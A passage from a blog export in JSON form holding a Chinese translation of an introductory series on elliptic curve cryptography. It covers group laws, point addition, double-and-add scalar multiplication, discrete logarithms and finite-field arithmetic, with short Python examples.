0$</li>\\n</ol>\\n\\n如果我们再加上第五个条件: \\n<br>\\n<strong>交换律:</strong> $a + b = b + a$\\n<br>\\n那么这个群就可以被称作<strong>阿贝尔群</strong>\\n\\n<p>\\n    根据加法的一般概念, 整数集合 $\\\\mathbb{Z}$ 是一个群 (更准确的说, 是一个阿贝尔群). 而自然数集合就不是一个群, 因为它无法满足第四个特征.\\n</p>\\n\\n<p>\\n    群很棒因为如果我们能证明以上四条特征是成立的, 那么我们就可以自动得到群的其他一些特征. 比如: <strong>单位元是唯一的</strong>; <strong>逆元也是唯一的</strong>, 意思是: 对群中的任何元素a来说, 有且仅有b使 $a + b = 0$ 成立(也可以把b写成-a). 这些关于群的特性稍后将会直接或间接的发挥重要的作用.\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"group-law\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线上的群律\"}],[\"html\",{\"html\":\"<p>\\n    我们可以在椭圆曲线上定义一个群, 具体来说:\\n</p>\\n\\n<ul>\\n  <li>\\n    群里的元素是椭圆曲线上的点\\n  </li>\\n  <li>\\n    <strong>单位元</strong>是指在无穷远处的点 0\\n  </li>\\n  <li>\\n    点P的<strong>逆元</strong>是指其关于x轴对称的点\\n  </li>\\n  <li>\\n    <strong>加法</strong>可以根据以下规则定义: <strong>找到三个在一条线上非零的点P,Q和R, 他们之和满足 $P + Q + R = 0$</strong>\\n  </li>\\n</ul>\"}],[\"image\",{\"src\":\"/content/images/2019/12/three-aligned-points.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n在一条直线上的三点之和为0\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n    注意最后一条规则, 我们只要求三个点位于一条直线上, 但是并没有要其顺序. 这意味着如果 P,Q和R在一条直线上, 则有 $P + (Q + R) = Q + (P + R) = R + (P + Q) = \\\\cdots = 0$. 这样, 我们有了一个直观的证明, <strong>我们定义的加法运算也满足结合律和交换律, 这是一个阿贝尔群.</strong>\\n</p>\\n\\n<p>\\n    到目前为止, 一切都很顺利. 但我们到底应该如何计算任意两个点之和呢?\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"geometric-addition\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 几何意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n    还好这是一个阿贝尔群, 我们可以把 $P + Q + R = 0$ 写成 $P + Q = -R$. 借助这种形式的方程, 我们可以推导出一种计算P和Q之和的几何方法: <strong>过点P,Q画一条直线, 这条直线将和曲线相交于第三个点R(这意味着P,Q和R位于一条直线上). 点R的逆元-R正是 $P + Q$ 的结果</strong>.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n过 P 和 Q 画一条直线交于第三点 R, 关于x轴与之对称的点 -R 即为 P+Q 之和.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  如果再做一些细化, 这个几何式的方法是行得通的. 具体来说, 我们需要回答以下几个问题: \\n    \\n  <ul>\\n    <li> <strong>当 P = 0 且 Q = 0 时会怎么样?</strong> 显然我们没法画出这样的直线(因为0根本不在xy平面上), 但是根据我们对单位元 0 的定义, $P + 0 = P$ 和 $0 + Q = Q$ 对任何 P 和 Q 都成立</li>\\n    <li> <strong>当 P = -Q 时会怎么样?</strong> 在这种情况下, 穿过两点的直线将与x轴垂直且不与其他任何点相交. 但当 P 是 Q 的逆元, 根据逆元的定义则有 $P + Q = P + (-P) = 0$ </li>\\n    <li> <strong>当 P = Q 时会怎么样?</strong> 在这种情况下, 过这个点可以作出无穷多条直线. 这里问题就开始变得有点复杂了. 首先考虑当 $Q' \\\\ne P$, 而让 Q' 逐渐接近 P 时会发生什么? </li>\\n  </ul>\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-point-doubling.gif\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n当两点逐渐靠近, 过这两个点的直线将变成曲线的一条切线\\n</pre>\"}],[\"html\",{\"html\":\"当 Q' 朝着 P 移动时, 穿过 P 和 Q' 的直线将变为曲线的一条切线. 据此我们可以得出解决 $P + P = -R$, R 是 P 点在曲线上的切线与曲线的交点.\"}],[\"html\",{\"html\":\"<p>\\n  <ul>\\n    <li> <strong> 如果 $P \\\\ne Q$, 而又不存在第三个点 R 呢?</strong> 这种情况和前一种很类似, 事实上这就是一条线经过了 P 和曲线上的一个切点 Q 的情况 </li>\\n  </ul>\\n<p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-tangent-line.gif\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n如果直线与曲线只相交于两点, 这表明这条线与曲线相切. \\n很容易就能看出两点之和为切点关于x轴的对称点.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  假设 P 是曲线上的切点, 在前一种情况下我们用 $P + P = -Q$ 表示, 这个方程也可以写成 $P + Q = -P$. 换句话说, 现在如果 Q 是曲线上的切点, 那么上面的等式就变成了 $Q + P = -Q$.\\n</p>\\n\\n<p>\\n  现在, 几何式的方法已经可以覆盖所有的场景了, 只需要一支铅笔和一把尺子我们就能计算出如何椭圆曲线上两个点的和. 如果你有兴趣的话, <strong>也可以看看我做的这个计算椭圆曲线加法的 <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">HTML5/JavaScript版可视化工具</a> !</strong>\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"algebraic-addition\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 代数意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n  如果你想用计算机来算两点之和, 我们就需要将几何式的求解方法转换成代数式的方法. 把上面的求解方法翻译成一系列的方程看起来很容易, 但是因为需要求解三次方程实际上也比较枯燥. 所以在这里我会直接给出结果.\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n椭圆曲线加法方程的代数方法推导在 <strong> <a href=\\\"https://github.com/jimmysong/programmingbitcoin/blob/master/ch02.asciidoc#coding-point-addition\\\"> Promgramming BitCoin 的第二章 </a> </strong> \\n中给出了详细的演算过程, 有兴趣的同学可以前往阅读 \\n</pre>\\n\\n<p>\\n    首先, 我们先排除各种麻烦的边界情况. 我们已经知道 $P + (-P) = 0$, 我们也知道 $P + 0 = 0 + P = P$, 所以在我们的方程式里我们会排除这两种情况, 我们只用考虑 <strong> 两个非零点, 以及非对称点 $P = (x_P, y_P)$ 和 $Q = (x_Q, y_Q)$. </strong>\\n</p>\\n\\n<p>\\n    如果 P 和 Q 不相等 ($x_P \\\\ne x_Q$), 则过两点的直线的斜率为:\\n    $$ m = \\\\frac{y_P - y_Q}{x_P - x_Q} $$ \\n    这条直线与椭圆曲线的交点 $R = (x_R, y_R)$ 有:\\n    $$ \\n    \\\\begin{array}{rcl}\\n    x_R & = & m^2 - x_P - x_Q \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P)\\n\\t\\\\end{array} \\n    $$\\n    或者写成: \\n    $$ y_R = y_Q + m(x_R - x_Q) $$\\n    则有 $(x_P, y_P) + (x_Q, y_Q) = (x_R, -y_R)$ (注意等式中的符号并始终牢记公式 $P + Q = -R$)\\n</p>\\n\\n<p>\\n    如果想要验证结果的正确性, 我们需要检查 R 是否是曲线上的一个点, 以及 P, R 和 Q 是否在一条直线上. 验证 P, R 和 Q 在一条直线上很容易, 但是检查 R 是否是曲线上的一点就没那么容易了, 因为这又需要求解三次方程, 会比较麻烦\\n</p>\\n\\n<p>\\n    作为替代方案, 我们可以用一个<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">可视化工具</a>通过一个例子来说明. 现在有 $P = (1, 2)$ , $Q = (3, 4)$ 在曲线 $y^2 = x^3 - 7x + 10$ 上, 这两点之和为 $P + Q = -R = (-3, 2)$. 我们来看看带入方程是否成立: \\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{2 - 4}{1 - 3} = 1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = 1^2 - 1 - 3 = -3 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + 1 \\\\cdot (-3 - 1) = -2 \\\\\\\\\\n    & = & y_Q + m(x_R - x_Q) = 4 + 1 \\\\cdot (-3 - 3) = -2\\n\\\\end{array}\\n    $$\\n    很好, 结果是正确的!\\n</p>\\n\\n<p>\\n  注意, 上面的方程在 <strong>P 或者 Q 是曲线上的切点<strong>时仍然是成立的. 让我们再试试 $P = (-1, 4)$ , $Q = (1, 2)$ 的情况.\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{4 - 2}{-1 - 1} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - (-1) - 1 = 1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 4 + -1 \\\\cdot (1 - (-1)) = 2\\n\\\\end{array}\\n    $$\\n  我们得出 $P + Q = (1, -2)$, 这个结果和用<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=-1&py=4&qx=1&qy=2\\\">可视化工具</a>算出的结果是一样的\\n</p>\\n    \\n<p>\\n    当 $P = Q$ 时, 处理起来会有点区别: 求 $x_R$ 和 $y_R$ 的方程是一样的, 不过由于 $x_P = x_Q$, 我们需要用不同的方程来计算<strong>斜率</strong>:\\n    $$ m = \\\\frac{3 x_P^2 + a}{2 y_P} $$\\n    正如我们所料, m 的表达式是如下方程的一阶导数: \\n    $$ y_P = \\\\pm \\\\sqrt{x_P^3 + ax_P + b} $$\\n    检查 R 点位于椭圆曲线上且穿过 P, R 两点的直线与曲线有且仅有两个交点就能证明结果的正确性, 但和前面一样, 我们还是通过一个例子来验证, 当 P = Q = (1, 2) 时\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{3x_P^2 + a}{2 y_P} = \\\\frac{3 \\\\cdot 1^2 - 7}{2 \\\\cdot 2} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - 1 - 1 = -1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + (-1) \\\\cdot (-1 - 1) = 4\\n\\\\end{array}\\n    $$\\n    可以得出 $P + P = -R = (-1, -4)$, <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=1&py=2&qx=1&qy=2\\\">结果是正确的!</a>\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"scalar-multiplication\\\"> </a>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法\"}],[\"html\",{\"html\":\"<p>\\n\\t除加法外, 我们还可以定义另一种运算: <strong>标量乘法</strong>, 如下: \\n    $$ \\n    nP = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n  \\t这里的 n 是一个自然数. 我也做了一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html\\\">可视化工具</a>, 有兴趣的话可以看看.\\n</p>\\n\\n<p>\\n  写成上面的形式, 看起来计算 nP 需要进行 n 次加法. 当 n 是一个k位(二进制)的数字, 我们的算法复杂度将会是 $O(2^k)$, 这太差了. 但实际上我们可以有更快的算法.\\n</p>\\n\\n<p id=\\\"double-and-add\\\">\\n  其中一种叫做<strong>倍加法</strong>(double and add algorithm). 通过一个例子我们可以更好地解释它的原理. 当 n = 151, 表示为二进制 $10010111_2$, 借助其二进制形式我们可以用以下表达式来表示:\\n    $$\\n    \\\\begin{array}{rcl}\\n    151 & = & 1 \\\\cdot 2^7 + 0 \\\\cdot 2^6 + 0 \\\\cdot 2^5 + 1 \\\\cdot 2^4 + 0 \\\\cdot 2^3 + 1 \\\\cdot 2^2 + 1 \\\\cdot 2^1 + 1 \\\\cdot 2^0 \\\\\\\\\\n    & = & 2^7 + 2^4 + 2^2 + 2^1 + 2^0\\n\\\\end{array}\\n    $$\\n    (将n转换成二进制并表示为多个2的指数次之和)\\n    通过上面的表达式, 我们可以写出: \\n    $$\\n    151 \\\\cdot P = 2^7 P + 2^4 P + 2^2 P + 2^1 P + 2^0 P\\n    $$\\n    倍加法的具体实现步骤如下:\\n    <ul>\\n        <li> 找到点 P </li>\\n        <li> 翻倍, 得到 2P </li>\\n        <li> 用 2P 加 P (得到 $2^1P + 2^0P$ 的结果) </li>\\n        <li> 2P 翻倍, 得到 2^2P </li>\\n        <li> 将其加入之前的结果中 (得到 $2^2P + 2^1P + 2^0P$ 的结果) </li>\\n        <li> $2^2P$ 翻倍得到 $2^3P$ </li>\\n        <li> 别加$2^3P$ </li>\\n        <li> $2^3P$ 翻倍得到 $2^4P$ </li>\\n        <li> 加入之前的结果(得到 $2^4P + 2^2P + 2^1P + 2^0P$) </li>\\n        <li> ... </li>\\n    </ul>\\n最后, 只需要通过7次翻倍(自己加自己)和4次累加就可以计算出 $151 \\\\cdot P$ 的结果. 要是还说得不够清楚, 这里有一个 Python脚本实现了这个算法\\n</p>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef bits(n):\\n    \\\"\\\"\\\"\\n    Generates the binary digits of n, starting\\n    from the least significant bit.\\n\\n    bits(151) -> 1, 1, 1, 0, 1, 0, 0, 1\\n    \\\"\\\"\\\"\\n    while n:\\n        yield n & 1\\n        n >>= 1\\n\\ndef double_and_add(n, x):\\n    \\\"\\\"\\\"\\n    Returns the result of n * x, computed using\\n    the double and add algorithm.\\n    \\\"\\\"\\\"\\n    result = 0\\n    addend = x\\n\\n    for bit in bits(n):\\n        if bit == 1:\\n            result += addend\\n        addend *= 2\\n\\n    return result\\n```\"}],[\"html\",{\"html\":\"<p>\\n因为翻倍和叠加都是 $O(1)$ 复杂度的运算, 那么这个算法的复杂度就是 $O(\\\\log n)$ (或者说 $O(k)$, k是数字的位长), 这样就挺好了. 至少比最开始复杂度为 $O(n)$ 的算法要好得多!\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 对数\"}],[\"html\",{\"html\":\"<p>\\n已知 n 和 P, 现在我们至少有一种方法可以在多项式时间算法可以算出 $Q = nP$. 但是如果反过来会怎么样? <strong>如果我们已知 Q 和 P 想要找出 n 呢.?</strong> 这个就是所谓的 <strong>对数难题.</strong> 我们把这个问题称作\\\"对数\\\"而不是\\\"除法\\\"主要是为了和其他密码学系统在概念上保持一致(在其他密码学系统中一般用指数而不是乘法).\\n</p>\\n\\n<p>\\n    我没听说过任何\\\"简单\\\"的算法可以用于解决对数难题, 不过通过<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html?a=-3&b=1&px=0&py=1\\\">尝试乘法</a>倒是可以找到一些规律. 比如, 已知曲线 $y^2 = x^3 - 3x + 1$ 和点 $P = (0, 1)$, 我们可以立刻验证出, 当 n 是一个奇数时,  $nP$ 会位于曲线的左侧平面, 如果 n 是一个偶数, $nP$ 会位于曲线的右侧平面. 如果我们做更多实验, 我们也许能够找出更多这样的规律, 也许可以帮助我们找到高效计算椭圆曲线上对数难题的方法.\\n</p>\\n\\n<p>\\n    不过对数难题还有一个变体: 离散对数难题. 在下一篇文章里我们将会看到, 如果我们缩小椭圆曲线的域, <strong>计算标量乘法仍然是\\\"容易的\\\", 不过求解离散对数将会成为一个\\\"十分困难\\\"的问题.</strong> 这个特性将成为椭圆曲线密码学的关键.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 未完待续\"}],[\"html\",{\"html\":\"<p>\\n    这就是今天的全部内容, 希望你能喜欢这篇博客! 下周我们将会通过一些例子和小工具探索 <strong>有限域</strong> 以及 <strong>离散对数难题</strong>. 如果这些内容听起来还不错, 那么就敬请期待吧!\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[10,30],[10,31],[10,32],[10,33],[10,34],[10,35],[10,36],[10,37],[10,38],[10,39],[10,40],[10,41],[10,42],[10,43],[10,44],[10,45],[10,46],[10,47],[10,48],[10,49],[10,50],[1,\"p\",[]]]}","created_at_ts":1577154363958,"created_at":"2019-12-24 02:26:04"},{"id":"5e0358032ee0ee0001819d31","post_id":"5e0067842ee0ee000181987b","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第二篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"这篇文章是[椭圆曲线密码学:入门](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)系列文章的第二篇.\\n\\n在[前一篇文章](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)中, 我们知道了如何在实数域上的椭圆曲线上定义一个群. 具体来说, 我们定义了[点加](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#group-law)的规则: 找到位于一条直线上的三个点, 三点之和为零($P + Q + R = 0$). 我们推导了求解点加的[几何方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#geometric-addition)与[代数方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#algebraic-addition).\\n\\n我们还介绍了[标量乘法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication)($nP = P + P + \\\\cdots + P$) 并且我们找到了一种用于计算标量乘法的\\\"简单\\\"算法: [倍加法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#double-and-add).\\n\\n**现在我们将要把椭圆曲线限制在有限域**而非所有实数的集合上, 让我们来看看这会产生怎样的变化.\"}],[\"markdown\",{\"markdown\":\"# 以p为模的整数域\"}],[\"html\",{\"html\":\"<p>\\n  有限域, 首先, 是指一个包含有限个元素的集合. 整数对质数p取模的集合就是有限域的一个例子, 一般用 $\\\\mathbb{Z}/p$, $GF(p)$ 或者 $\\\\mathbb{F}_p$ 表示. 这里我们采用最后一种表示方法.\\n</p>\\n\\n<p>\\n  在域上存在二元运算: 加法(+)和乘法(·), 他们都满足封闭性, 结合律和交换律. 对这两种操作都存在一个唯一的单位元, 并且对每个元素都有且仅有一个逆元. 最后, 乘法还满足分配率: $x \\\\cdot (y + z) = x \\\\cdot y + x \\\\cdot z$\\n</p>\\n\\n<p>\\n  这个集合由<strong>从0到p-1之间的所有整数构成<strong>. 加法和乘法遵循模运算法则(也叫\\\"时钟运算\\\"). 这里有一些在 $\\\\mathbb{F}_{23}$ 上运算的例子:\\n    \\n  <ul>\\n    <li> 加法: $(18 + 9) \\\\bmod{23} = 4$ </li>\\n    <li> 减法: $(7 - 14) \\\\bmod{23} = 16$ </li>\\n    <li> 乘法: $4 \\\\cdot 7 \\\\bmod{23} = 5$ </li>\\n    <li> \\n        加法逆运算: $-5 \\\\bmod{23} = 18$ <br>\\n        推导: $(5 + (-5)) \\\\bmod{23} = (5 + 18) \\\\bmod{23} = 0$\\n    </li>\\n    <li> \\n        乘法逆运算: $9^{-1} \\\\bmod{23} = 18$ <br>\\n        推导: $9 \\\\cdot 9^{-1} \\\\bmod{23} = 9 \\\\cdot 18 \\\\bmod{23} = 1$\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注:\\n  根据费马小定理可知, $9^{22} \\\\bmod{23} = 1$,\\n  所以 $9^{-1} \\\\bmod{23} = 9^{-1+22} \\\\bmod{23} = 18$\\n  这样理解起来要更容易一些\\n</pre>\\n    </li>\\n  </ul>\\n</p>\\n    \\n<p>\\n  如果这些等式看起来很陌生那么你需要先了解一点关于模运算的基本知识, 可以看看 [Khan Academy的这篇教程](https://www.khanacademy.org/computing/computer-science/cryptography/modarithmetic/a/what-is-modular-arithmetic)\\n</p>\\n    \\n<p>\\n    正如我们所言, 以p为模的整数是一个域, 它具备上述所有的特征. 需要注意的是p必须是一个质数! 以4为模的整数不是一个域: 2没有乘法逆元(等式 $2 \\\\cdot x \\\\bmod{4} = 1$ 没有解)\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 以p为模的除法运算\"}],[\"html\",{\"html\":\"<p>\\n  我们将会定义 $\\\\mathbb{F}_p$ 上的椭圆曲线, 但在那之前我们需要对 $\\\\mathbb{F}_p$ 上的 $x / y$ 表示什么意思有一个清晰的认识. 根据 $x / y = x \\\\cdot y^{-1}$, 或者简单的说, x 除以 y 等于 x 乘以 y 的乘法逆元. 这没什么好奇怪的, 不过它为我们提供了一种计算除法的基本方法: <strong> 找到这个数的乘法逆元再用计算乘法的方法在计算它 </strong>\\n</p>\\n\\n<p>\\n  借助<a href=\\\"https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95\\\">扩展欧几里得算法</a>计算乘法逆元是比较\\\"容易\\\"完成, 在最坏的情况下, 算法的复杂度为 $O(\\\\log p)$ (或者按位长来算, $O(k)$).\\n  我们不会详细讲解扩展的欧几里得算法, 因为这不是本文要讨论的, 不过这里有一份Python版的实现代码:\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n  扩展欧几里得算法 也叫 扩展的辗转相除法, \\n  该算法在译者的之前的博客 <a href=\\\"http://blog.chxj.name/understanding-rsa-algorithm/\\\">读跨越千年的RSA算法</a> 一文中曾有讲到, \\n  有兴趣的读者可以前往阅读\\n</pre>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef extended_euclidean_algorithm(a, b):\\n    \\\"\\\"\\\"\\n    Returns a three-tuple (gcd, x, y) such that\\n    a * x + b * y == gcd, where gcd is the greatest\\n    common divisor of a and b.\\n\\n    This function implements the extended Euclidean\\n    algorithm and runs in O(log b) in the worst case.\\n    \\\"\\\"\\\"\\n    s, old_s = 0, 1\\n    t, old_t = 1, 0\\n    r, old_r = b, a\\n\\n    while r != 0:\\n        quotient = old_r // r\\n        old_r, r = r, old_r - quotient * r\\n        old_s, s = s, old_s - quotient * s\\n        old_t, t = t, old_t - quotient * t\\n\\n    return old_r, old_s, old_t\\n\\n\\ndef inverse_of(n, p):\\n    \\\"\\\"\\\"\\n    Returns the multiplicative inverse of\\n    n modulo p.\\n\\n    This function returns an integer m such that\\n    (n * m) % p == 1.\\n    \\\"\\\"\\\"\\n    gcd, x, y = extended_euclidean_algorithm(n, p)\\n    assert (n * x + p * y) % p == gcd\\n\\n    if gcd != 1:\\n        # Either n is 0, or p is not a prime number.\\n        raise ValueError(\\n            '{} has no multiplicative inverse '\\n            'modulo {}'.format(n, p))\\n    else:\\n        return x % p\\n```\"}],[\"html\",{\"html\":\"<h1> $\\\\mathbb{F}_p$ 上的椭圆曲线 </h1>\"}],[\"html\",{\"html\":\"<p>\\n    现在, 我们已经掌握了将椭圆曲线限定在 $\\\\mathbb{F}_p$ 上所需的全部要素, 这些点的集合, 按前<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#elliptic-curves\\\">一篇文章</a>可以表示成: \\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in \\\\mathbb{R}^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 = x^3 + ax + b, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\ne 0\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    现在则应该写成:\\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in (\\\\mathbb{F}_p)^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 \\\\equiv x^3 + ax + b \\\\pmod{p}, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\not\\\\equiv 0 \\\\pmod{p}\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    0 仍然是无穷远处的点, 而 a 和 b 是 $\\\\mathbb{F}_p$ 上的两个整数.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/elliptic-curves-mod-p.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n以上是当 p = 19, 97, 127, 487 时, 曲线 $y^2 \\\\equiv x^3 - 7x + 10 \\\\pmod{p}$ 的图形. 注意, 在每个 x 坐标上最多有2个点, 且整个图形关于 $y = p / 2$ 水平对称.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singular-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n 曲线 $y^2 \\\\equiv x^3 \\\\pmod{29}$ 是奇异的并且在有三个点落在 (0,0) 上. 这样的曲线就不是有效的椭圆曲线\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n之前连续的曲线现在变成了xy平面上一些离散的点的集合. 然而我们还是能证明, 即使我们限制了曲线的域, <strong>这个在 $\\\\mathbb{F}_p$ 上的椭圆曲线仍然是一个阿贝尔群</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 点加\"}],[\"html\",{\"html\":\"<p>\\n显然, 为了让加法在 $\\\\mathbb{F}_p$ 上仍然有效, 我们需要稍微调整一下定义. 在实数域上, 我们说位于一条直线上的三点之和为0($P + Q + R = 0$). 我们可以保留这个定义, 但是在 $\\\\mathbb{F}_p$ 上三点连成一线是什么意思呢?\\n</p>\\n\\n<p>\\n    我们说<strong>当有一条直线能将三个点连起来时, 三点就位于一条直线上.</strong> 当然, $\\\\mathbb{F}_p$(有限域)上的直线和$\\\\mathbb{R}$(实数域)上的直线是不一样的. 通俗的说, $\\\\mathbb{F}_p$ 上的直线是指满足方程 $ax + by + c \\\\equiv 0 \\\\pmod{p}$ 的所有点 $(x, y)$ 的集合(即加上 \\\"$(\\\\text{mod}\\\\ p)$\\\" 的标准直线方程).\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  上图为曲线 $y^2 \\\\equiv x^3 - x + 3 \\\\pmod{127}$ 上 点$P = (16, 20)$ 和 点$Q = (41, 120)$ 的加法. 看看直线$y \\\\equiv 4x + 83 \\\\pmod{127}$是如何通过在平面上不断\\\"重复\\\"出现将这些点连接起来的.\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n   既然我们在一个群里, 那么点加就具有以下这些我们已知的属性: \\n  <ul>\\n    <li> $Q + 0 = 0 + Q = Q$ (根据单位元的定义可得) </li>\\n    <li> 已知一个非零点 Q , 其逆元 -Q 将具有与之相同的横坐标和相反的纵坐标. 或者, 也可以表示成 $-Q = (x_Q, -y_Q \\\\bmod{p})$. 例如, $\\\\mathbb{F}_{29}$ 上的曲线上有一点 Q = (2, 5), 该点的逆元 $-Q = (2, -5 \\\\bmod{29}) = (2, 24)$ </li>\\n    <li> 还有, $P + (-P) = 0$ (根据逆元的定义) </li>\\n  </ul>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数求和\"}],[\"html\",{\"html\":\"<p>\\n    这里计算点加的方程与在前一篇文章里讲的完全一样, 除了我们需要再每个方程末尾加上 $\\\\text{mod}\\\\ p$. 所以, 已知 $P = (x_P, y_P)$, $Q = (x_Q, y_Q)$ 和 $R = (x_R, y_R)$, 我们可以通过以下方法计算 $P + Q = -R$:\\n    $$\\n    \\\\begin{array}{rcl}\\n  x_R & = & (m^2 - x_P - x_Q) \\\\bmod{p} \\\\\\\\\\n  y_R & = & [y_P + m(x_R - x_P)] \\\\bmod{p} \\\\\\\\\\n  & = & [y_Q + m(x_R - x_Q)] \\\\bmod{p}\\n\\\\end{array}\\n    $$\\n    当 $P \\\\ne Q$, 斜率 m 可以表示为:\\n    $$ m = (y_P - y_Q)(x_P - x_Q)^{-1} \\\\bmod{p} $$\\n    而当 $P = Q$, 可得: \\n    $$ m = (3 x_P^2 + a)(2 y_P)^{-1} \\\\bmod{p} $$\\n</p>\\n\\n<p>\\n  上面的方程没有任何变化并非是一个巧合: 事实上, 这些方程在任何域下都是成立的, 无论是有限域还是非有限域(需要排除$\\\\mathbb{F}_2$ 和 $\\\\mathbb{F}_3$ 这两种特殊情况). 我似乎应该为这个说法提供一些依据, 不过问题在于: 关于群论的证明总会涉及到各种复杂的数学概念. 不过, 我还是找到了一个只使用初等数学概念推导论证的<a 